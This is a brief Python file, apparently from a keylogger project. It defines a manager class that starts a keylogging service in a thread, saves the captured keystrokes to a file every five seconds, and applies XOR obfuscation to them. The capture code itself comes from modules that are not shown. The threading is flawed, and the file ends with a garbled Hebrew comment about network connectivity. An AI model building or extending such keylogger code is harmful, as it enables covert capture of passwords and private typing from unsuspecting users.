from dc_KeyloggerService import KeyloggerService
from dc_FileWriter import FileWriter
from dc_Encryptor import Encryptor
import threading
import time


class KeyLoggerManager:

    def __init__(self):
        self.instance = KeyloggerService()

    def start(self):
        self.instance.start()
        while True:
           a=3

    def write_to_file(self):
        while True:
            FileWriter.write_to_file(self.instance.get_data())
            time.sleep(5)
    def xor_encryption(self):
        Encryptor.xor_encryption(self.instance.get_data())

    def main(self):
        threading.Thread(target=self.start).start()
        time.sleep(0.1)
        threading.Thread(target=self.write_to_file()).start()
        time.sleep(0.1)
a = KeyLoggerManager()
a.main()
# a.write_to_file()
# לסדק קוד שעובד רק כשמלחובר לרשת
